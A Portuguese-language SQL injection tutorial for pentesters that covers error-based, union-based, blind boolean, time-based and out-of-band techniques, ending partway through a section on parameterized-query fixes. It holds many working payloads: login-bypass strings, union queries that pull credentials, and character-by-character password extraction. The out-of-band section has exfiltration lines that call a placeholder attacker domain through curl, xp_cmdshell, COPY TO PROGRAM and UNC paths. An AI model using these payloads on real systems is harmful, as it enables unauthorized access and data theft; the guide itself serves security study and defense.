<!--
title: SQL Injections
desc: Guia prático de SQLi (In-band, Error-based, Blind, Time-based) com foco em extração manual de dados e desvio de autenticação.
tags: web-sec, sqli, database
readTime: 7 min
-->

<!-- ===================================== -->
<!--           SQL INJECTION               -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Web%20Application%20Security-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Database-MySQL%20%7C%20PostgreSQL%20%7C%20MSSQL-black?style=flat-square">
  <img src="https://img.shields.io/badge/Discipline-SQL%20Injection-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Beginner%20%E2%86%92%20Advanced-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Status-Study%20Guide-green?style=flat-square">
</p>

---

# 💉 SQL Injection (SQLi)
## Guia Completo para Pentesters

> Um guia técnico e prático sobre **SQL Injection (SQLi)** abordando desde os conceitos fundamentais da linguagem SQL até técnicas modernas de exploração, enumeração, bypass de autenticação, ataques Blind SQL Injection e métodos de mitigação utilizados em aplicações web reais.

---
## Introdução

### O que é SQL Injection?

A **Injeção de SQL (SQLi)** é uma das vulnerabilidades de aplicações web mais conhecidas e perigosas, classificada na categoria [OWASP A05:2025 – Injeção](https://owasp.org/Top10/2025/A05_2025-Injection). Ela ocorre quando um atacante consegue manipular as consultas SQL que uma aplicação web envia ao seu banco de dados, transformando entrada de usuário em código executável.

![](https://blogs.zeiss.com/digital-innovation/de/wp-content/uploads/sites/2/2020/05/201909_Security_SQL-Injection_1.png)

### Impacto e Consequências

As consequências de uma exploração bem-sucedida podem ser devastadoras:

- **Acesso não autorizado** a dados sensíveis (informações pessoais, credenciais, dados financeiros)
- **Bypass de autenticação** - acesso sem credenciais válidas
- **Modificação ou exclusão** de registros e tabelas inteiras
- **Escalonamento de privilégios** no banco de dados
- **Execução de comandos** no sistema operacional (em casos extremos)
- **Comprometimento total** do servidor de banco de dados

### Relevância Atual

Apesar de ser uma das classes de vulnerabilidade mais antigas na segurança web (documentada desde 1998), a Injeção de SQL continua sendo uma ameaça real em aplicações modernas. Ela esteve na origem de inúmeros vazamentos de dados de grande repercussão que afetaram milhões de usuários, incluindo:

- **LinkedIn (2012)** - 6,5 milhões de hashes de senhas expostos
- **Sony Pictures (2011)** - 77 milhões de contas comprometidas
- **Equifax (2017)** - 147 milhões de registros expostos

### O Papel do Pentester

Para um profissional de testes de invasão (pentester), saber identificar e explorar falhas de SQLi é uma habilidade **fundamental** que será utilizada ao longo de toda a carreira. Esta vulnerabilidade está consistentemente no Top 10 da OWASP e é um dos primeiros vetores testados em qualquer avaliação de segurança web.

---
## Conceitos Fundamentais de SQL para Injeção

Antes de explorar as técnicas de SQL Injection, é preciso compreender recursos do SQL que vão além do básico. Eles constituem os elementos fundamentais que permitem o funcionamento dos _payloads_ de injeção.

### 1. Comentários SQL

Os comentários instruem o banco de dados a ignorar tudo o que vier na sequência daquela linha. No **MySQL**, você pode usar:

- `--` (dois hífens seguidos de **espaço**) para comentário de linha única
- `#` para comentário de linha única (alternativa MySQL)
- `/* */` para comentários de múltiplas linhas

#### Por que isso é importante para injeção?

Ao injetar código no meio de uma consulta existente, frequentemente sobra sintaxe SQL após o seu payload, o que causaria um erro. Um comentário permite descartar de forma limpa o restante da consulta original.

**Exemplo prático:**

Consulta original:

```sql
SELECT * FROM usuarios WHERE username='INPUT' AND password='secret';
```

Inserindo `admin'--` como nome de usuário:

```sql
SELECT * FROM usuarios WHERE username='admin'-- ' AND password='secret';
                                                      ↑
                                              Todo o resto é ignorado
```

A verificação de senha nunca é executada porque o `--` comenta toda a parte restante da consulta.

### 2. UNION

O operador `UNION` combina os resultados de duas ou mais instruções `SELECT` em um único conjunto de resultados.

**Regra fundamental:** ambas as instruções `SELECT` devem retornar o **mesmo número de colunas**, e as colunas devem ter **tipos de dados compatíveis**.

```sql
SELECT nome, idade FROM alunos 
UNION 
SELECT username, id FROM admins;
```

#### Como atacantes usam UNION

Atacantes utilizam o `UNION` para anexar sua própria instrução `SELECT` a uma consulta legítima, extraindo dados de tabelas completamente diferentes. Este é o princípio da **Injeção de SQL baseada em UNION (Union-Based SQL Injection)**.

Se a consulta original seleciona 3 colunas, o `UNION SELECT` injetado também deve selecionar exatamente 3 valores.

### 3. LIKE e Caracteres Curinga

O operador `LIKE` realiza a correspondência de padrões em strings:

- `%` - corresponde a **qualquer sequência** de caracteres (zero ou mais)
- `_` - corresponde a **exatamente um** caractere

```sql
SELECT * FROM usuarios WHERE username LIKE 'adm%';
-- Retorna: admin, administrator, admin123, etc.

SELECT * FROM usuarios WHERE username LIKE 'a_min';
-- Retorna: admin, armin, aamin (qualquer caractere na posição 2)
```

#### Uso em ataques de Blind Injection

Em ataques de Blind Injection (injeção cega), os invasores utilizam o operador `LIKE` com caracteres curinga para enumerar dados caractere por caractere — testando `LIKE 'a%'`, `LIKE 'b%'`, etc., até encontrar correspondências.

### 4. LIMIT

A cláusula `LIMIT` restringe o número de linhas retornadas. A sintaxe `LIMIT offset, count` permite pular linhas e controlar o tamanho do resultado.

```sql
SELECT * FROM usuarios LIMIT 1;       -- retorna apenas a primeira linha
SELECT * FROM usuarios LIMIT 2, 1;    -- pula 2 linhas, retorna a 3ª
SELECT * FROM usuarios LIMIT 5;       -- retorna as 5 primeiras linhas
```

#### Uso em payloads

Em payloads de injeção, o `LIMIT` é frequentemente utilizado para:

- Controlar qual linha é retornada na extração de dados
- Evitar que a saída fique sobrecarregada com excesso de resultados
- Extrair dados de forma sequencial (linha por linha)

### 5. Funções de String

Duas funções são particularmente úteis ao extrair dados por meio de injeção:

#### group_concat()

Agrupa valores de várias linhas em uma única string separada por vírgulas:

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') 
FROM usuarios;
```

Retorna: `admin:pass123<br>martin:secret<br>jim:work456`

#### CONCAT()

Combina valores individuais em uma única string:

```sql
SELECT CONCAT(username, ':', password) FROM usuarios WHERE id=1;
-- Retorna: admin:pass123 (para uma única linha)
```

### 6. O Banco de Dados information_schema

Todo servidor **MySQL, MariaDB e PostgreSQL** possui um banco de dados integrado chamado `information_schema`. Ele contém **metadados** sobre todos os outros bancos de dados do servidor: nomes de bancos, tabelas, colunas, tipos de dados, etc.

Pense nele como um **mapa** que o próprio banco de dados possui de si mesmo.

#### Tabelas mais importantes:

**information_schema.tables**

- `table_schema` → nome do banco de dados
- `table_name` → nome da tabela

**information_schema.columns**

- `table_name` → tabela à qual a coluna pertence
- `column_name` → nome da coluna
- `data_type` → tipo de dado da coluna    

#### Exemplo de uso em ataques:

```sql
-- Listar todas as tabelas do banco atual
SELECT table_name FROM information_schema.tables 
WHERE table_schema = database();

-- Descobrir colunas de uma tabela específica
SELECT column_name FROM information_schema.columns 
WHERE table_name = 'usuarios';
```

#### Importância para SQL Injection

Ao realizar uma injeção Union-Based, o `information_schema` é o recurso que permite passar de "consigo injetar código" para **"conheço todas as tabelas e colunas deste banco de dados"**.

### Observação sobre Sistemas de Banco de Dados

**Este guia utiliza sintaxe MySQL.** Outros sistemas possuem suas próprias variações:

|Sistema|Comentário|Tabelas de Sistema|Funções Úteis|
|---|---|---|---|
|**MySQL**|`--`, `#`|`information_schema`|`database()`, `user()`|
|**PostgreSQL**|`--`|`information_schema`|`current_database()`|
|**MSSQL**|`--`|`master..sysobjects`|`db_name()`, `@@version`|
|**Oracle**|`--`|`ALL_TABLES`|`SYS.DATABASE_NAME`|
|**SQLite**|`--`|`sqlite_master`|`sqlite_version()`|

Os conceitos fundamentais são aplicáveis a todos, mas os _payloads_ exatos variam. Depois de dominar a injeção em MySQL, adaptar-se a outros sistemas é mais simples.

---
## O que é SQL Injection?

### Definição Técnica

A Injeção de SQL ocorre quando uma aplicação web incorpora uma entrada fornecida pelo usuário **diretamente** em uma consulta SQL, sem a devida sanitização ou parametrização. A entrada do atacante é tratada como **código SQL** em vez de dados, permitindo-lhe alterar a lógica da consulta.

### Como as Aplicações Web Utilizam SQL

Ao navegar em um site, muitas das páginas são geradas dinamicamente a partir de um banco de dados.

**Exemplo típico:** blog com artigos

URL: `https://meublog.com/artigo?id=1`

O servidor extrai o valor `1` da URL e o insere em uma consulta SQL:

```sql
SELECT * FROM artigos WHERE id = 1 AND publico = 1;
```

O banco de dados retorna o artigo com ID 1 (se público), e o servidor o renderiza na página.

### Onde Reside a Vulnerabilidade

O problema surge quando a aplicação constrói a consulta **concatenando** diretamente a entrada do usuário.

**Código vulnerável (PHP):**

```php
$query = "SELECT * FROM artigos WHERE id = " . $_GET['id'] . " AND publico = 1;";
```

Se o atacante modifica a URL para `?id=1 OR 1=1--`, a consulta se torna:

```sql
SELECT * FROM artigos WHERE id = 1 OR 1=1-- AND publico = 1;
                                                      ↑
                                              O resto é ignorado
```

O `OR 1=1` torna a cláusula `WHERE` **sempre verdadeira**, e o `--` comenta a verificação `AND publico = 1`. O banco de dados retorna **todos** os artigos, incluindo os privados.

### Os 3 Tipos de SQL Injection

![](https://www.dnsstuff.com/wp-content/uploads/2019/09/Types-of-SQL-Injections-1024x536.jpg)

As técnicas de SQL Injection são categorizadas com base em **como** o atacante recebe o retorno do banco de dados:

#### 1. In-Band SQL Injection

Os resultados da injeção são retornados **diretamente** na resposta da aplicação web. É o tipo mais simples e comum.

**Subtipos:**

- **Error-Based (Baseado em erro):** Mensagens de erro do banco de dados revelam informações
- **Union-Based (Baseado em UNION):** Usa `UNION` para anexar consultas e extrair dados

#### 2. Blind SQL Injection

A aplicação **não exibe** resultados ou mensagens de erro. O atacante infere informações indiretamente.

**Subtipos:**

- **Authentication Bypass:** Sucesso/falha no login revela se a condição é verdadeira
- **Boolean-Based:** Mudanças sutis na resposta indicam verdadeiro/falso
- **Time-Based:** Atrasos na resposta indicam se a condição é verdadeira

#### 3. Out-of-Band SQL Injection

O banco de dados realiza uma **solicitação de rede externa** (DNS/HTTP) para exfiltrar dados. Usado quando nenhuma das outras técnicas funciona.

### Detectando SQL Injection

#### Onde Testar

Pontos comuns de injeção incluem:

- **Parâmetros de URL** (`?id=1`, `?user=admin`)
- **Campos de formulário** (login, busca, comentários)
- **Cookies** (especialmente parâmetros como `userid`)
- **Cabeçalhos HTTP** (`User-Agent`, `Referer`, `X-Forwarded-For`)

#### Métodos de Detecção

**1. Injeção de caracteres de teste:**

```sql
'               → Erro de sintaxe? Provavelmente vulnerável
"               → Testar se usa aspas duplas
;--             → Comportamento diferente? Injeção confirmada
OR 1=1          → Altera os resultados?
```

**2. Observação da resposta:**

- Erros de banco de dados visíveis → Error-Based
- Mudança no conteúdo → Boolean-Based
- Atraso na resposta → Time-Based
- Nenhuma mudança visível → Possível Blind

**Exemplo prático:**

```sql
https://site.com/produto?id=1'
-- Se retornar erro como "You have an error in your SQL syntax", é vulnerável
```

---
## SQL Injection In-Band

### Visão Geral

O SQL Injection **In-Band** é a categoria mais comum e a mais fácil de explorar. O termo "In-Band" significa que o **mesmo canal** de comunicação utilizado para realizar a injeção é também utilizado para receber os resultados.

### 1. SQL Injection Baseado em Erros (Error-Based)

Explora mensagens de erro do banco de dados exibidas ao usuário. Quando mal configurada, a aplicação revela informações valiosas.

#### Como funciona

Injetar uma aspa simples (`'`) em um parâmetro vulnerável:

```sql
https://site.com/artigo?id=1'
```

Erro típico:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**Informações reveladas:**

- Sistema de banco de dados: MySQL
- Tipo de delimitador: aspas simples
- Consulta vulnerável não está tratada

#### Extração de dados via erro

Podemos usar **funções que causam erros** para extrair informações:

```sql
-- Extrair nome do banco de dados
1 AND extractvalue(1, concat(0x7e, database()))

-- Extrair versão do MySQL
1 AND extractvalue(1, concat(0x7e, version()))

-- Extrair nome do usuário
1 AND extractvalue(1, concat(0x7e, user()))
```

#### Quando usar Error-Based

✅ **Vantagens:**

- Extração rápida e direta
- Não requer adivinhação
- Funciona mesmo quando não há saída visível (erros aparecem)

❌ **Desvantagens:**

- Depende de mensagens de erro expostas
- Pode não funcionar em produção (erros geralmente ocultos)
- Algumas funções podem estar desabilitadas

### 2. SQL Injection Baseada em UNION (Union-Based)

Utiliza o operador `UNION` para anexar sua própria consulta `SELECT` à consulta original.

#### Metodologia Passo a Passo

##### Passo 1: Determinar o número de colunas

Injete `UNION SELECT` com quantidade crescente de valores:

```sql
-- Erro: número incorreto de colunas
1 UNION SELECT 1

-- Erro ainda
1 UNION SELECT 1,2

-- Sucesso! A tabela tem 3 colunas
1 UNION SELECT 1,2,3
```

**Dica:** use `ORDER BY` como alternativa:

```sql
1 ORDER BY 1 -- Sucesso
1 ORDER BY 2 -- Sucesso
1 ORDER BY 3 -- Sucesso
1 ORDER BY 4 -- Erro (4 colunas não existem)
```

##### Passo 2: Identificar colunas visíveis

Altere o valor para `-1` ou `0` para que a consulta original não retorne resultados:

```sql
-1 UNION SELECT 1,2,3
```

Os números que aparecem na página indicam **quais colunas são exibidas** e podem ser usadas para extração.

##### Passo 3: Extrair nome do banco de dados

```sql
-1 UNION SELECT 1,2,database()
-- Retorna: sqli_one
```

##### Passo 4: Enumerar tabelas

```sql
-1 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'sqli_one'
```

##### Passo 5: Listar colunas

```sql
-1 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'usuarios'
```

##### Passo 6: Extrair dados

```sql
-1 UNION SELECT 1,2,group_concat(concat_ws(':', username, password)) 
FROM usuarios
```

#### Exemplo Completo

**Objetivo:** Extrair credenciais de uma aplicação de blog

1. **Descobrir número de colunas:**

```sql
?id=1 UNION SELECT 1,2,3,4 → Sucesso (4 colunas)
```

2. **Identificar coluna de saída:**

```sql
?id=-1 UNION SELECT 1,2,3,4 → Números aparecem, "3" está visível
```

3. **Obter nome do banco:**

```sql
?id=-1 UNION SELECT 1,2,database(),4 → "sqli_one"
```

4. **Listar tabelas:**

```sql
?id=-1 UNION SELECT 1,2,group_concat(table_name),4 
FROM information_schema.tables 
WHERE table_schema='sqli_one'
→ "posts,usuarios,comentarios"
```

5. **Obter colunas de usuarios:**

```sql
?id=-1 UNION SELECT 1,2,group_concat(column_name),4 
FROM information_schema.columns 
WHERE table_name='usuarios'
→ "id,username,password,email"
```

6. **Extrair credenciais:**

```sql
?id=-1 UNION SELECT 1,2,group_concat(concat_ws(':', username, password),4 
FROM usuarios
→ "admin:admin123,joao:senha456"
```

### Comparação: Error-Based vs Union-Based

|Aspecto|Error-Based|Union-Based|
|---|---|---|
|**Velocidade**|Rápida|Média|
|**Precisão**|Alta|Alta|
|**Visibilidade**|Mensagens de erro|Saída da página|
|**Requisições**|Poucas|Muitas (para enumerar)|
|**Complexidade**|Simples|Moderada|

---
## Blind SQL Injection: Bypass de Autenticação

### O que é Blind SQL Injection?

O Blind SQL Injection (Injeção Cega) ocorre quando a aplicação **não mostra** resultados de consultas ou mensagens de erro ao usuário. A injeção ainda funciona, mas você **não tem uma maneira direta** de visualizar a saída.

Em vez disso, você deve inferir o sucesso com base no **comportamento da aplicação:**

- Login bem-sucedido ou não?
- Conteúdo da página mudou?
- A resposta demorou mais tempo?

### Como Funcionam Consultas de Autenticação

Formulários de login típicos:

```sql
SELECT * FROM usuarios 
WHERE username='bob' AND password='secret123' LIMIT 1;
```

A aplicação:

1. Executa a consulta
2. Se retornar **linhas** → autenticado
3. Se retornar **zero linhas** → credenciais inválidas    

**A aplicação nunca exibe os resultados da consulta.**

### O Ataque: O Famoso ' OR 1=1--

A chave é fazer a consulta retornar **pelo menos uma linha**.

**Payload:** `' OR 1=1;--`

No campo de usuário:

```sql
SELECT * FROM usuarios 
WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```

**Análise:**

1. `username=''` → falso (nome vazio não existe)
2. `OR 1=1` → **sempre verdadeiro**
3. Toda a cláusula `WHERE` torna-se verdadeira
4. `;--` encerra a instrução e comenta o resto
5. O banco retorna **todas** as linhas
6. A aplicação autentica o **primeiro usuário** (geralmente admin)

### Visando um Usuário Específico

```sql
admin'-- 
```

Resulta em:

```sql
SELECT * FROM usuarios 
WHERE username='admin'--' AND password='anything' LIMIT 1;
```

A verificação de senha é comentada, e você autentica como **admin sem senha**.

### Variações de Payload

|Payload|Uso|
|---|---|
|`' OR 1=1;--`|Método clássico para aspas simples|
|`' OR 1=1#`|MySQL com #|
|`" OR 1=1--`|Aspas duplas|
|`admin'--`|Login específico|
|`' OR '1'='1`|Alternativa sem comentários|
|`' OR 1=1 OR ''='`|Evita quebras de sintaxe|

### Como Testar na Prática

**Passo 1:** Identifique formulários de login

**Passo 2:** Teste o campo de usuário:

```text
usuário: admin'-- 
senha: (qualquer coisa)
```

**Passo 3:** Se não funcionar, teste o campo de senha:

```text
usuário: admin
senha: ' OR 1=1;--
```

**Passo 4:** Teste variações:

```text
usuário: ' OR 1=1;--
senha: anything
```

**Passo 5:** Verifique se há algum campo vulnerável:

- Se os dois campos usam aspas simples → testar ambos
- Se há escape de caracteres → tentar codificações alternativas

### Prevenção para Bypass de Autenticação

**NUNCA** confie apenas em validação de entrada para autenticação. Use:

1. **Prepared Statements** (obrigatório)
2. **Hash de senhas** (nunca armazenar em texto plano)
3. **MFA** (Autenticação de Múltiplos Fatores)
4. **Rate Limiting** (limitar tentativas de login)
5. **Logs de tentativas** (monitorar ataques)    

---
## Blind SQL Injection: Booleano e Tempo

### 1. Blind SQL Injection Baseada em Booleano (Boolean-Based)

#### Como funciona

A aplicação retorna um **sinal binário** - alguma distinção entre verdadeiro e falso:

- Conteúdo de página diferente
- Resposta JSON `{"taken":true}` vs `{"taken":false}`
- Mensagem de erro vs sucesso
- Mudança sutil no HTML

Você usa esse feedback de dois estados para fazer perguntas **"sim ou não"** ao banco de dados.

#### Exemplo: Verificador de Nome de Usuário

URL: `https://site.com/checkuser?username=admin`  
Resposta: `{"taken":true}`

URL: `https://site.com/checkuser?username=admin123`  
Resposta: `{"taken":false}`

**Consulta vulnerável:**

```sql
SELECT * FROM usuarios WHERE username = '%username%' LIMIT 1;
```

**O Ataque:**

```sql
-- Encontrar primeiro caractere do banco de dados
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

Resposta: `{"taken":false}` (não é 'a')

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

Resposta: `{"taken":true}` (é 's'!) ✅

#### Técnica de Enumeracão Caractere por Caractere

**Para nomes de bancos:**

```sql
-- Posição 1
' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--  → false
' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--  → true ✅

-- Posição 2
' UNION SELECT 1,2,3 WHERE database() LIKE 'sa%';-- → false
' UNION SELECT 1,2,3 WHERE database() LIKE 'sq%';-- → true ✅

-- Posição 3
' UNION SELECT 1,2,3 WHERE database() LIKE 'sqa%';-- → false
' UNION SELECT 1,2,3 WHERE database() LIKE 'sql%';-- → true ✅

-- Continue até obter o nome completo
```

**Para tabelas:**

```sql
' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sql_db' AND table_name LIKE 'u%';--
```

**Para colunas:**

```sql
' UNION SELECT 1,2,3 FROM information_schema.columns 
WHERE table_name = 'usuarios' AND column_name LIKE 'p%';--
```

### 2. Blind SQL Injection Baseada em Tempo (Time-Based)

#### Quando usar

Use Time-Based quando:

- A aplicação não fornece **nenhuma** informação visual (mesmo conteúdo, mesmo status)
- Boolean-Based não funciona (resposta sempre idêntica)
- Você precisa de um indicador confiável

#### Como funciona

A função `SLEEP()` do MySQL pausa a execução por N segundos:

```sql
SELECT * FROM usuarios WHERE id = 1 AND SLEEP(5);
-- A consulta leva 5 segundos para completar
```

Combinando com uma condição:

```sql
-- Se o banco começar com 's', pausa por 5 segundos
' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

**Resposta:**

- Atraso de 5 segundos → condição verdadeira ✅    
- Resposta imediata → condição falsa ❌


#### Metodologia Passo a Passo

**Passo 1: Encontrar número de colunas**

```sql
' UNION SELECT SLEEP(5);--              → imediato (colunas erradas)
' UNION SELECT SLEEP(5),2;--            → 5s delay (2 colunas!)
' UNION SELECT SLEEP(5),2,3;--          → imediato (3 colunas, errado)
```

**Passo 2: Enumerar banco de dados**

```sql
' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'a%';--  → imediato
' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--  → 5s delay ✅
```

**Passo 3: Continuar caractere por caractere**

```sql
' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sq%';-- → 5s delay
' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'sql%';-- → 5s delay
```

**Passo 4: Enumerar tabelas**

```sql
' UNION SELECT SLEEP(3),2 FROM information_schema.tables 
WHERE table_schema = 'sql_db' AND table_name LIKE 'u%';--
```

**Passo 5: Extrair dados**

```sql
' UNION SELECT SLEEP(3),2 FROM usuarios 
WHERE username='admin' AND password LIKE 'a%';--
```

#### Comandos Equivalentes em Outros Bancos

|Banco|Função de Delay|
|---|---|
|**MySQL**|`SLEEP(seconds)`|
|**PostgreSQL**|`pg_sleep(seconds)`|
|**MSSQL**|`WAITFOR DELAY '0:0:5'`|
|**Oracle**|`DBMS_LOCK.SLEEP(seconds)`|

### Comparação: Boolean-Based vs Time-Based

|Aspecto|Boolean-Based|Time-Based|
|---|---|---|
|**Feedback**|Mudança de conteúdo|Atraso na resposta|
|**Velocidade**|Rápida|Muito lenta|
|**Precisão**|Alta|Média (rede pode atrapalhar)|
|**Detecção**|Fácil|Difícil (requer timing)|
|**Custo**|Baixo (poucas requisições)|Alto (muitas requisições)|

### Dicas e Truques

#### Para Boolean-Based:

1. **Use SUBSTRING para precisão:**

```sql
' UNION SELECT 1,2,3 WHERE SUBSTRING(database(),1,1) = 's';--
```

2. **Aproveite padrões:**

```sql
-- Teste múltiplos caracteres de uma vez
LIKE 's%' → primeiro é 's'
LIKE 'sq%' → segundo é 'q'
```

3. **Use ASCII para caracteres especiais:**

```sql
WHERE ASCII(SUBSTRING(database(),1,1)) = 115
```

#### Para Time-Based:

1. **Use delays maiores** (5-10 segundos) para evitar falsos positivos
2. **Teste cada caractere 2-3 vezes** para confirmar
3. **Monitore a latência base** (tempo normal de resposta)
4. **Em MSSQL, use:**

```sql
WAITFOR DELAY '0:0:5'
```

### Exemplo Prático de Time-Based

**Cenário:** API que verifica disponibilidade de username

**Payload completo para extrair senha:**

```sql
username=' UNION SELECT SLEEP(5),2 FROM usuarios 
WHERE username='admin' AND SUBSTRING(password,1,1)='a';--
```

**Interpretação:**

- Se atrasar 5s → primeiro caractere é 'a'
- Se não atrasar → teste próximo caractere

**Extraindo senha completa:**

```text
Posição 1: 'a' → delay ✅ → 'a'
Posição 2: 'b' → delay ❌, 'c' → delay ❌, 'd' → delay ✅ → 'd'
Posição 3: 'm' → delay ✅ → 'm'
Posição 4: 'i' → delay ✅ → 'i'
Posição 5: 'n' → delay ✅ → 'n'
```

**Resultado:** senha = `admin`

---
## SQL Injection Out-of-Band

### O que é Out-of-Band (OOB)?

O SQL Injection Out-of-Band funciona de maneira diferente de tudo o que vimos. Em vez de ler os resultados pela resposta da aplicação, você força o servidor de banco de dados a se conectar a um **servidor controlado por você** através de um **canal separado** (DNS ou HTTP) e transmitir os dados roubados nessa conexão.

### Quando Utilizar OOB

O OOB é usado quando **todas as outras abordagens falham**:

- ❌ **In-Band** não é viável (sem saída visível)
- ❌ **Boolean-Based** não funciona (resposta sempre igual)
- ❌ **Time-Based** não confiável (rede instável, SLEEP bloqueada)
- ✅ **O banco de dados pode realizar conexões de saída**

### Pré-requisitos para OOB

1. O servidor de banco de dados **pode realizar conexões de saída** (DNS/HTTP)
2. Você tem um servidor **acessível publicamente** para receber os dados
3. Não há firewall bloqueando tráfego de saída do banco

### Como Funciona

Dois canais estão envolvidos:

1. **Canal de ataque**: sua requisição web padrão contendo o payload
2. **Canal de dados**: requisição de rede de saída do banco ao seu servidor

### Técnica: Exfiltração via DNS com MySQL

A técnica OOB mais comum para MySQL usa `LOAD_FILE()` para disparar consultas DNS.

#### Sintaxe Básica

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.seu-dominio.com\\share'));
```

#### Como funciona passo a passo:

1. `(SELECT database())` obtém o nome do banco (ex: `webapp_db`)
2. `CONCAT()` constrói a string `\\webapp_db.seu-dominio.com\share`
3. `LOAD_FILE()` tenta ler o caminho UNC
4. No Windows, isso inicia uma **consulta DNS** para `webapp_db.seu-dominio.com`
5. Seu servidor DNS captura a solicitação e registra o subdomínio

#### Exemplo Completo

**Payload:**

```sql
id=1; SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.seu-dominio.com\\share'))--
```

**O que acontece:**

1. Banco executa: `SELECT database()` → `"sistema_db"`
2. Concatena: `\\sistema_db.seu-dominio.com\share`
3. Tenta acessar o caminho UNC
4. Servidor DNS consulta: `sistema_db.seu-dominio.com`
5. Seu servidor registra: `sistema_db.seu-dominio.com` ✅

#### Extraindo Dados Complexos

**Nomes de tabelas:**

```sql
SELECT LOAD_FILE(CONCAT('\\\\', 
   (SELECT group_concat(table_name) FROM information_schema.tables 
    WHERE table_schema=database()), 
   '.seu-dominio.com\\share'))
```

**Senhas:**

```sql
SELECT LOAD_FILE(CONCAT('\\\\', 
   (SELECT group_concat(username,':',password SEPARATOR '-') 
    FROM usuarios), 
   '.seu-dominio.com\\share'))
```

### Técnicas para MSSQL

O Microsoft SQL Server tem procedimentos armazenados que tornam o OOB mais direto.

#### xp_dirtree (Always Available)

```sql
EXEC master..xp_dirtree '\\seu-dominio.com\share';
```

Aciona consulta DNS ao tentar listar um diretório remoto.

**Com dados exfiltrados:**

```sql
DECLARE @cmd VARCHAR(1000);
SET @cmd = '\\' + (SELECT database()) + '.seu-dominio.com\share';
EXEC master..xp_dirtree @cmd;
```

#### xp_cmdshell (Se habilitado)

```sql
-- Precisa estar habilitado (desabilitado por padrão)
EXEC xp_cmdshell 'nslookup dados.seu-dominio.com';

-- Ou usando curl
EXEC xp_cmdshell 'curl http://seu-dominio.com/' + (SELECT @@version);
```

### Técnicas para PostgreSQL

```sql
-- Usando COPY para enviar dados via HTTP
COPY (SELECT 'dados') TO PROGRAM 'curl -d @- http://seu-dominio.com';

-- Via DNS com extensão dblink
SELECT * FROM dblink('host=' || (SELECT user) || '.seu-dominio.com', 'SELECT 1');
```

### Recebendo os Dados

Você precisa de algo escutando do seu lado:

#### 1. Burp Collaborator

- Fornece subdomínio exclusivo
- Registra DNS e HTTP callbacks
- Interface gráfica fácil

#### 2. Interactsh (ProjectDiscovery)

- Gratuito
- Pode ser auto-hospedado
- Suporta DNS, HTTP, SMTP

```bash
interactsh-client
```

#### 3. Servidor DNS Personalizado (Python)

```python
from dnslib import *
from dnslib.server import DNSServer

class CustomResolver:
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        print(f"DNS Query: {qname}")  # Dados exfiltrados aqui
        reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=60))
        return reply

server = DNSServer(CustomResolver(), port=53)
server.start()
```

#### 4. Servidor HTTP Simples

```bash
# Iniciar servidor Python
python3 -m http.server 80

# Ou com Netcat
nc -lvnp 80
```

### Limitações do OOB

|Limitação|Impacto|
|---|---|
|**Firewall de saída**|Técnica bloqueada se banco não pode sair|
|**Específico por banco**|Payloads variam (MySQL vs MSSQL vs PostgreSQL)|
|**Tamanho do DNS**|Subdomínios limitados a 63 caracteres|
|**Lentidão**|Mais lento que In-Band|
|**Dependência de plataforma**|`LOAD_FILE()` funciona melhor no Windows|
|**Logs**|Pode ser detectado em logs de DNS|

### Detecção e Prevenção

#### Como Identificar OOB em Logs:

- **Logs de DNS:** consultas para domínios suspeitos com subdomínios longos
- **Logs de Proxy:** tráfego HTTP de saída do servidor de banco
- **Monitoramento de rede:** conexões externas inesperadas

#### Prevenção:

1. **Restringir tráfego de saída** (firewall)
2. **Desabilitar LOAD_FILE()** no MySQL
3. **Revogar privilégios** de procedimentos como `xp_cmdshell`
4. **Monitorar logs de DNS** para padrões suspeitos

### Quando OOB é a Única Opção

**Cenário real:** API REST que retorna `{"success":true}` ou `{"success":false}` sem conteúdo. Timings não confiáveis devido à rede. Nenhum erro visível.

**Solução:** OOB com DNS:

1. Injeta payload que faz o banco consultar seu domínio
2. Monitora logs DNS para extrair dados
3. Funciona mesmo se a aplicação não mostrar nada    

---

## Remediação e Prevenção

### 1. Prepared Statements (Consultas Parametrizadas)

**A solução definitiva.** Separar SQL dos dados:

#### PHP (PDO) - Correto:

```php
// VULNERÁVEL
$query = "SELECT * FROM usuarios WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);

// CORRIGIDO
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

#### Python (MySQL Connector):

```python
# VULNERÁVEL
query = f"SELECT * FROM usuarios WHERE username='{username}'"
cursor.execute(query)

# CORRIGIDO
cursor.execute("SELECT * FROM usuarios WHERE username = %s", (username,))
```

#### Java (JDBC):

```java
// VULNERÁVEL
String query = "SELECT * FROM usuarios WHERE username='" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// CORRIGIDO
String query = "SELECT * FROM usuarios WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

#### Node.js (mysql2):

```javascript
// VULNERÁVEL
const query = `SELECT * FROM usuarios WHERE username='${username}'`;
